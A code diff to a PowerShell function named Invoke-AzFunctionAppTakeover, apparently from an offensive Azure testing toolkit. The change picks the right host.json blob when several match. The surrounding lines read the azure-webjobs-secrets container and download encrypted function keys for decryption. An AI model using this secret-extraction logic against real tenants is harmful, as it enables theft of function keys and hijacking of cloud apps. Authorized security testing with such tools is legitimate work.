@@ -266,6 +266,13 @@ function Invoke-AzFunctionAppTakeover{
 
                         # Get the function app keys to decrypt
                         $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
+                        $secretsIter = 0
+                        if($secretsfile.count -gt 1){
+                            $secretsfile | ForEach-Object{
+                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
+                                $secretsIter += 1
+                            }
+                        }
                         $TempFile = New-TemporaryFile
                         Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                         $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)
@@ -340,6 +347,13 @@ function Invoke-AzFunctionAppTakeover{
 
                         # Get the function app keys to decrypt
                         $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
+                        $secretsIter = 0
+                        if($secretsfile.count -gt 1){
+                            $secretsfile | ForEach-Object{
+                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
+                                $secretsIter += 1
+                            }
+                        }
                         $TempFile = New-TemporaryFile
                         Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                         $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)
